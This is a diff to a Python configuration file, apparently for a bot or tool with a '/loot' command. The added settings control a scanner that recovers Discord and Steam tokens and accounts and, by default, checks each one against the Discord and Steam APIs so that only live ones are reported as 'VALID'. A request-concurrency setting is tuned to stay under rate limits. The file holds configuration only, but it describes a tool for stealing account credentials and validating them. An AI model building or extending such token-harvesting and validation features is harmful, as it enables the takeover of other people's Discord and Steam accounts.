@@ -76,3 +76,15 @@ QUEUE_UPDATE_INTERVAL: float = 30.0                # seconds
 
 # ── Cleanup ─────────────────────────────────────────────────
 TEMP_FILE_MAX_AGE_HOURS: int = 1
+
+# ── Loot (/loot command) ────────────────────────────────────
+# When True the /loot scanner additionally hits the Discord and Steam
+# APIs to validate each recovered token / account and only reports
+# live ones as "VALID". Turning this off makes the scan fully offline
+# and noticeably faster, at the cost of also emitting dead tokens.
+LOOT_VALIDATE: bool = _str("LOOT_VALIDATE", "true").lower() in (
+    "1", "true", "yes", "on",
+)
+# Concurrency used for the validation HTTP requests. Discord and Steam
+# both rate-limit by IP — keep this small to stay polite.
+LOOT_VALIDATE_CONCURRENCY: int = _int("LOOT_VALIDATE_CONCURRENCY", 8)
